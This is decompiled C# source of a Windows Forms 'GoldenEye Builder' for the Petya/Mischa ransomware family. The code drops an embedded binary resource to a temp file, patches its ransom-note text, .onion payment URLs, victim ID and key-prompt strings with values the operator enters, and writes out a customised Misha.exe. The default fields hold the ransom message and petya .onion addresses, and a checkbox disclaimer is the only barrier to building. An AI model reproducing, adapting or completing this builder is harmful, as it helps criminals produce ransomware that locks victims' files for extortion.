using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Petya_and_GoldenEye_BUILDER.Properties;

namespace Petya_and_GoldenEye_BUILDER;

public class Form1 : Form
{
	private string mihabin;

	private string m_origname;

	private string m_origmain;

	private string m_origcode;

	private string m_origif;

	private string m_origkey;

	private string m_onion1;

	private string m_onion2;

	private string m_id;

	private IContainer components = null;

	private Label label1;

	private GroupBox groupBox1;

	private Label label12;

	private Label label11;

	private Label label10;

	private Label label9;

	private Label label8;

	private TextBox textBox9;

	private TextBox textBox8;

	private TextBox textBox7;

	private TextBox textBox6;

	private TextBox textBox5;

	private Button button1;

	private GroupBox groupBox4;

	private Label label7;

	private Label label5;

	private Label label4;

	private Label label3;

	private Label label2;

	private GroupBox groupBox2;

	private GroupBox groupBox3;

	private GroupBox groupBox5;

	private CheckBox checkBox1;

	private Label label14;

	private Label label15;

	private Label label6;

	private Label label13;

	private TextBox textBox2;

	private TextBox textBox1;

	private Label label16;

	private Label label17;

	private TextBox textBox3;

	private Label label18;

	public Form1()
	{
		InitializeComponent();
	}

	private void exitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		RemoveFiles();
	}

	public void ReplaceMethod()
	{
		if (((Control)textBox5).get_Text().Length < m_origname.Length)
		{
			string text = ((Control)textBox5).get_Text();
			for (int i = 0; i < m_origname.Length - ((Control)textBox5).get_Text().Length; i++)
			{
				text += " ";
			}
			((Control)textBox5).set_Text(text);
		}
		if (((Control)textBox7).get_Text().Length < m_origcode.Length)
		{
			string text2 = ((Control)textBox7).get_Text();
			for (int j = 0; j < m_origcode.Length - ((Control)textBox7).get_Text().Length; j++)
			{
				text2 += " ";
			}
			((Control)textBox7).set_Text(text2);
		}
		if (((Control)textBox8).get_Text().Length < m_origif.Length)
		{
			string text3 = ((Control)textBox8).get_Text();
			for (int k = 0; k < m_origif.Length - ((Control)textBox8).get_Text().Length; k++)
			{
				text3 += " ";
			}
			((Control)textBox8).set_Text(text3);
		}
		if (((Control)textBox9).get_Text().Length < m_origkey.Length)
		{
			string text4 = ((Control)textBox9).get_Text();
			for (int l = 0; l < m_origkey.Length - ((Control)textBox9).get_Text().Length; l++)
			{
				text4 += " ";
			}
			((Control)textBox9).set_Text(text4);
		}
		if (((Control)textBox1).get_Text().Length < m_onion1.Length)
		{
			string text5 = ((Control)textBox1).get_Text();
			for (int m = 0; m < m_onion1.Length - ((Control)textBox1).get_Text().Length; m++)
			{
				text5 += " ";
			}
			((Control)textBox1).set_Text(text5);
		}
		if (((Control)textBox2).get_Text().Length < m_onion2.Length)
		{
			string text6 = ((Control)textBox2).get_Text();
			for (int n = 0; n < m_onion2.Length - ((Control)textBox2).get_Text().Length; n++)
			{
				text6 += " ";
			}
			((Control)textBox2).set_Text(text6);
		}
		if (((Control)textBox3).get_Text().Length < m_id.Length)
		{
			string text7 = ((Control)textBox3).get_Text();
			for (int num = 0; num < m_id.Length - ((Control)textBox3).get_Text().Length; num++)
			{
				text7 += " ";
			}
			((Control)textBox3).set_Text(text7);
		}
		if (((Control)textBox6).get_Text().Length != 499)
		{
			string text8 = ((Control)textBox6).get_Text();
			for (int num2 = 0; num2 < 499 - ((Control)textBox6).get_Text().Length; num2++)
			{
				text8 += " ";
			}
			((Control)textBox6).set_Text(text8);
		}
		if (((Control)textBox6).get_Text().Split(new string[1] { Environment.NewLine }, StringSplitOptions.None).Length < 10)
		{
			string text9 = ((Control)textBox6).get_Text();
			for (int num3 = 0; num3 < 10 - ((Control)textBox6).get_Text().Split(new string[1] { Environment.NewLine }, StringSplitOptions.None).Length; num3++)
			{
				text9 += Environment.NewLine;
			}
			((Control)textBox6).set_Text(text9);
		}
		ReplaceTextInFile(mihabin, m_origname, ((Control)textBox5).get_Text());
		ReplaceTextInFile(mihabin, m_origmain, ((Control)textBox6).get_Text());
		ReplaceTextInFile(mihabin, m_origcode, ((Control)textBox7).get_Text());
		ReplaceTextInFile(mihabin, m_origif, ((Control)textBox8).get_Text());
		ReplaceTextInFile(mihabin, m_origkey, ((Control)textBox9).get_Text());
		ReplaceTextInFile(mihabin, m_onion1, ((Control)textBox1).get_Text());
		ReplaceTextInFile(mihabin, m_onion2, ((Control)textBox2).get_Text());
		ReplaceTextInFile(mihabin, m_id, ((Control)textBox3).get_Text());
		((Control)textBox1).set_Text(m_onion1);
		((Control)textBox2).set_Text(m_onion2);
		((Control)textBox3).set_Text(m_id);
		((Control)textBox5).set_Text(m_origname);
		((Control)textBox6).set_Text(m_origmain);
		((Control)textBox7).set_Text(m_origcode);
		((Control)textBox8).set_Text(m_origif);
		((Control)textBox9).set_Text(m_origkey);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		if (checkBox1.get_Checked())
		{
			if (File.Exists(Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\Misha.exe"))
			{
				File.Delete(Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\Misha.exe");
			}
			InstallFiles();
			ReplaceMethod();
			File.Move(mihabin, Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\Misha.exe");
			RemoveFiles();
			MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\Misha.exe", "Successful.", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Please accept terms of service", "Aborted!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void ReplaceTextInFile(string fileName, string oldText, string newText)
	{
		byte[] array = File.ReadAllBytes(fileName);
		byte[] bytes = Encoding.UTF8.GetBytes(oldText);
		byte[] bytes2 = Encoding.UTF8.GetBytes(newText);
		int num = IndexOfBytes(array, bytes);
		if (num >= 0)
		{
			byte[] array2 = new byte[array.Length + bytes2.Length - bytes.Length];
			Buffer.BlockCopy(array, 0, array2, 0, num);
			Buffer.BlockCopy(bytes2, 0, array2, num, bytes2.Length);
			Buffer.BlockCopy(array, num + bytes.Length, array2, num + bytes2.Length, array.Length - num - bytes.Length);
			File.WriteAllBytes(fileName, array2);
		}
	}

	private int IndexOfBytes(byte[] searchBuffer, byte[] bytesToFind)
	{
		int num = 0;
		while (true)
		{
			if (num < searchBuffer.Length - bytesToFind.Length)
			{
				bool flag = true;
				for (int i = 0; i < bytesToFind.Length; i++)
				{
					if (searchBuffer[num + i] != bytesToFind[i])
					{
						flag = false;
						break;
					}
				}
				if (flag)
				{
					break;
				}
				num++;
				continue;
			}
			return -1;
		}
		return num;
	}

	public void InstallFiles()
	{
		File.WriteAllBytes(Path.GetTempPath() + "\\m.bin", Resources.miha);
	}

	public void GetFilePaths()
	{
		mihabin = Path.GetTempPath() + "\\m.bin";
	}

	public void LoadOrig()
	{
		m_origname = ((Control)textBox5).get_Text();
		m_origmain = ((Control)textBox6).get_Text();
		m_origcode = ((Control)textBox7).get_Text();
		m_origif = ((Control)textBox8).get_Text();
		m_origkey = ((Control)textBox9).get_Text();
		m_onion1 = ((Control)textBox1).get_Text();
		m_onion2 = ((Control)textBox2).get_Text();
		m_id = ((Control)textBox3).get_Text();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		LoadOrig();
		InstallFiles();
		GetFilePaths();
	}

	public void RemoveFiles()
	{
		File.Delete(Path.GetTempPath() + "\\g.bin");
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Control)textBox5).set_Text("");
	}

	private void textBox5_TextChanged(object sender, EventArgs e)
	{
		((Control)label2).set_Text(((Control)textBox5).get_Text().Length + " of");
		if (((Control)textBox5).get_Text().Length > 42)
		{
			((Control)textBox5).set_Text(((Control)textBox5).get_Text().Remove(((Control)textBox5).get_Text().Length - 1));
		}
	}

	private void textBox6_TextChanged(object sender, EventArgs e)
	{
		((Control)label3).set_Text(((Control)textBox6).get_Text().Length + " of");
		if (((Control)textBox6).get_Text().Length > 499)
		{
			((Control)textBox6).set_Text(((Control)textBox6).get_Text().Remove(((Control)textBox6).get_Text().Length - 1));
		}
	}

	private void textBox7_TextChanged(object sender, EventArgs e)
	{
		((Control)label4).set_Text(((Control)textBox7).get_Text().Length + " of");
		if (((Control)textBox7).get_Text().Length > 46)
		{
			((Control)textBox7).set_Text(((Control)textBox7).get_Text().Remove(((Control)textBox7).get_Text().Length - 1));
		}
	}

	private void textBox8_TextChanged(object sender, EventArgs e)
	{
		Label val = label5;
		TextBox val2 = textBox8;
		((Control)val).set_Text(((Control)val2).get_Text().Length + " of");
		if (((Control)val2).get_Text().Length > 57)
		{
			((Control)val2).set_Text(((Control)val2).get_Text().Remove(((Control)val2).get_Text().Length - 1));
		}
	}

	private void textBox9_TextChanged(object sender, EventArgs e)
	{
		Label val = label7;
		TextBox val2 = textBox9;
		((Control)val).set_Text(((Control)val2).get_Text().Length + " of");
		if (((Control)val2).get_Text().Length > 32)
		{
			((Control)val2).set_Text(((Control)val2).get_Text().Remove(((Control)val2).get_Text().Length - 1));
		}
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
		Label val = label14;
		TextBox val2 = textBox1;
		((Control)val).set_Text(((Control)val2).get_Text().Length + " of");
		if (((Control)val2).get_Text().Length > 36)
		{
			((Control)val2).set_Text(((Control)val2).get_Text().Remove(((Control)val2).get_Text().Length - 1));
		}
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
		Label val = label6;
		TextBox val2 = textBox2;
		((Control)val).set_Text(((Control)val2).get_Text().Length + " of");
		if (((Control)val2).get_Text().Length > 38)
		{
			((Control)val2).set_Text(((Control)val2).get_Text().Remove(((Control)val2).get_Text().Length - 1));
		}
	}

	private void textBox3_TextChanged(object sender, EventArgs e)
	{
		Label val = label16;
		TextBox val2 = textBox3;
		((Control)val).set_Text(((Control)val2).get_Text().Length + " of");
		if (((Control)val2).get_Text().Length > 96)
		{
			((Control)val2).set_Text(((Control)val2).get_Text().Remove(((Control)val2).get_Text().Length - 1));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_14b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_14c3: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		groupBox1 = new GroupBox();
		label18 = new Label();
		label16 = new Label();
		label17 = new Label();
		textBox3 = new TextBox();
		label14 = new Label();
		label15 = new Label();
		label6 = new Label();
		label13 = new Label();
		textBox2 = new TextBox();
		textBox1 = new TextBox();
		label7 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label12 = new Label();
		label11 = new Label();
		label10 = new Label();
		label9 = new Label();
		label8 = new Label();
		textBox9 = new TextBox();
		textBox8 = new TextBox();
		textBox7 = new TextBox();
		textBox6 = new TextBox();
		textBox5 = new TextBox();
		button1 = new Button();
		groupBox4 = new GroupBox();
		groupBox2 = new GroupBox();
		groupBox3 = new GroupBox();
		groupBox5 = new GroupBox();
		checkBox1 = new CheckBox();
		((Control)groupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(Color.Lime);
		((Control)label1).set_Location(new Point(20, 21));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(408, 18));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("you became a victim of the MISCHA RANSOMWARE!");
		((Control)groupBox1).set_BackColor(Color.Black);
		((Control)groupBox1).get_Controls().Add((Control)(object)label18);
		((Control)groupBox1).get_Controls().Add((Control)(object)label16);
		((Control)groupBox1).get_Controls().Add((Control)(object)label17);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label14);
		((Control)groupBox1).get_Controls().Add((Control)(object)label15);
		((Control)groupBox1).get_Controls().Add((Control)(object)label6);
		((Control)groupBox1).get_Controls().Add((Control)(object)label13);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox1);
		((Control)groupBox1).get_Controls().Add((Control)(object)label7);
		((Control)groupBox1).get_Controls().Add((Control)(object)label5);
		((Control)groupBox1).get_Controls().Add((Control)(object)label4);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).get_Controls().Add((Control)(object)label12);
		((Control)groupBox1).get_Controls().Add((Control)(object)label11);
		((Control)groupBox1).get_Controls().Add((Control)(object)label10);
		((Control)groupBox1).get_Controls().Add((Control)(object)label9);
		((Control)groupBox1).get_Controls().Add((Control)(object)label8);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox9);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox8);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox7);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox6);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox5);
		((Control)groupBox1).set_ForeColor(Color.Lime);
		((Control)groupBox1).set_Location(new Point(23, 42));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(444, 370));
		((Control)groupBox1).set_TabIndex(7);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Expert editor MISCHA");
		((Control)label18).set_AutoSize(true);
		((Control)label18).set_ForeColor(Color.Silver);
		((Control)label18).set_Location(new Point(286, 334));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(65, 13));
		((Control)label18).set_TabIndex(24);
		((Control)label18).set_Text("(this is an id)");
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_ForeColor(Color.Silver);
		((Control)label16).set_Location(new Point(348, 336));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(40, 13));
		((Control)label16).set_TabIndex(23);
		((Control)label16).set_Text("XXX of");
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_ForeColor(Color.Silver);
		((Control)label17).set_Location(new Point(385, 336));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(48, 13));
		((Control)label17).set_TabIndex(22);
		((Control)label17).set_Text("96 chars");
		((Control)textBox3).set_BackColor(Color.Black);
		((Control)textBox3).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox3).set_Location(new Point(6, 318));
		((TextBoxBase)textBox3).set_Multiline(true);
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(432, 35));
		((Control)textBox3).set_TabIndex(21);
		((Control)textBox3).set_Text("fdREF2yU2H89wqVVtUtj6oVYjezDpdjfKKexPWmMKGP8ewwTUWAuPRJ1bsyK2YNyPEUHUWAmyvjo9ayVFjq55JLtuD908fA1");
		((Control)textBox3).add_TextChanged((EventHandler)textBox3_TextChanged);
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_ForeColor(Color.Silver);
		((Control)label14).set_Location(new Point(348, 220));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(40, 13));
		((Control)label14).set_TabIndex(20);
		((Control)label14).set_Text("XXX of");
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_ForeColor(Color.Silver);
		((Control)label15).set_Location(new Point(385, 220));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(48, 13));
		((Control)label15).set_TabIndex(19);
		((Control)label15).set_Text("36 chars");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_ForeColor(Color.Silver);
		((Control)label6).set_Location(new Point(348, 245));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(40, 13));
		((Control)label6).set_TabIndex(18);
		((Control)label6).set_Text("XXX of");
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_ForeColor(Color.Silver);
		((Control)label13).set_Location(new Point(385, 245));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(48, 13));
		((Control)label13).set_TabIndex(17);
		((Control)label13).set_Text("38 chars");
		((Control)textBox2).set_BackColor(Color.Black);
		((Control)textBox2).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox2).set_Location(new Point(6, 242));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(432, 20));
		((Control)textBox2).set_TabIndex(16);
		((Control)textBox2).set_Text("http://petya3sen7dyko2n.onion/dREF2y");
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox1).set_Location(new Point(6, 217));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(432, 20));
		((Control)textBox1).set_TabIndex(15);
		((Control)textBox1).set_Text("http://petya3jxfp2f7g3i.onion/dREF2y");
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_ForeColor(Color.Silver);
		((Control)label7).set_Location(new Point(348, 295));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(40, 13));
		((Control)label7).set_TabIndex(14);
		((Control)label7).set_Text("XXX of");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_ForeColor(Color.Silver);
		((Control)label5).set_Location(new Point(348, 270));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(40, 13));
		((Control)label5).set_TabIndex(13);
		((Control)label5).set_Text("XXX of");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_ForeColor(Color.Silver);
		((Control)label4).set_Location(new Point(348, 196));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(40, 13));
		((Control)label4).set_TabIndex(12);
		((Control)label4).set_Text("XXX of");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(Color.Silver);
		((Control)label3).set_Location(new Point(342, 170));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(40, 13));
		((Control)label3).set_TabIndex(11);
		((Control)label3).set_Text("XXX of");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_ForeColor(Color.Silver);
		((Control)label2).set_Location(new Point(346, 23));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(40, 13));
		((Control)label2).set_TabIndex(10);
		((Control)label2).set_Text("XXX of");
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_ForeColor(Color.Silver);
		((Control)label12).set_Location(new Point(385, 295));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(48, 13));
		((Control)label12).set_TabIndex(9);
		((Control)label12).set_Text("32 chars");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_ForeColor(Color.Silver);
		((Control)label11).set_Location(new Point(385, 270));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(48, 13));
		((Control)label11).set_TabIndex(8);
		((Control)label11).set_Text("57 chars");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_ForeColor(Color.Silver);
		((Control)label10).set_Location(new Point(385, 196));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(48, 13));
		((Control)label10).set_TabIndex(7);
		((Control)label10).set_Text("46 chars");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_ForeColor(Color.Silver);
		((Control)label9).set_Location(new Point(379, 170));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(54, 13));
		((Control)label9).set_TabIndex(6);
		((Control)label9).set_Text("499 chars");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_ForeColor(Color.Silver);
		((Control)label8).set_Location(new Point(385, 23));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(48, 13));
		((Control)label8).set_TabIndex(5);
		((Control)label8).set_Text("42 chars");
		((Control)textBox9).set_BackColor(Color.Black);
		((Control)textBox9).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox9).set_Location(new Point(6, 292));
		((Control)textBox9).set_Name("textBox9");
		((Control)textBox9).set_Size(new Size(432, 20));
		((Control)textBox9).set_TabIndex(4);
		((Control)textBox9).set_Text("Incorrect key! Please try again.");
		((Control)textBox9).add_TextChanged((EventHandler)textBox9_TextChanged);
		((Control)textBox8).set_BackColor(Color.Black);
		((Control)textBox8).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox8).set_Location(new Point(6, 267));
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(432, 20));
		((Control)textBox8).set_TabIndex(3);
		((Control)textBox8).set_Text("If you already purchased your key, please enter it below.");
		((Control)textBox8).add_TextChanged((EventHandler)textBox8_TextChanged);
		((Control)textBox7).set_BackColor(Color.Black);
		((Control)textBox7).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox7).set_Location(new Point(6, 192));
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(432, 20));
		((Control)textBox7).set_TabIndex(2);
		((Control)textBox7).set_Text(" 3. Enter your personal decryption code there:");
		((Control)textBox7).add_TextChanged((EventHandler)textBox7_TextChanged);
		((Control)textBox6).set_BackColor(Color.Black);
		((Control)textBox6).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox6).set_Location(new Point(6, 44));
		((TextBoxBase)textBox6).set_Multiline(true);
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(432, 143));
		((Control)textBox6).set_TabIndex(1);
		((Control)textBox6).set_Text(componentResourceManager.GetString("textBox6.Text"));
		((Control)textBox6).add_TextChanged((EventHandler)textBox6_TextChanged);
		((Control)textBox5).set_BackColor(Color.Black);
		((Control)textBox5).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)textBox5).set_Location(new Point(6, 20));
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(432, 20));
		((Control)textBox5).set_TabIndex(0);
		((Control)textBox5).set_Text("You became victim of the PETYA RANSOMWARE!");
		((Control)textBox5).add_TextChanged((EventHandler)textBox5_TextChanged);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Lime);
		((Control)button1).set_Location(new Point(23, 441));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(444, 33));
		((Control)button1).set_TabIndex(14);
		((Control)button1).set_Text("BUILD GOLDENEYE");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)groupBox4).set_Location(new Point(5, 474));
		((Control)groupBox4).set_Name("groupBox4");
		((Control)groupBox4).set_Size(new Size(478, 22));
		((Control)groupBox4).set_TabIndex(17);
		groupBox4.set_TabStop(false);
		((Control)groupBox2).set_Location(new Point(5, 16));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(11, 461));
		((Control)groupBox2).set_TabIndex(17);
		groupBox2.set_TabStop(false);
		((Control)groupBox3).set_Location(new Point(472, 18));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(11, 459));
		((Control)groupBox3).set_TabIndex(18);
		groupBox3.set_TabStop(false);
		((Control)groupBox5).set_Location(new Point(5, 0));
		((Control)groupBox5).set_Name("groupBox5");
		((Control)groupBox5).set_Size(new Size(478, 18));
		((Control)groupBox5).set_TabIndex(18);
		groupBox5.set_TabStop(false);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(23, 418));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(300, 17));
		((Control)checkBox1).set_TabIndex(19);
		((Control)checkBox1).set_Text("You will not run this program on your or someone else's PC");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(489, 503));
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)groupBox5);
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_ForeColor(Color.Lime);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("GoldenEye Builder V1.O");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
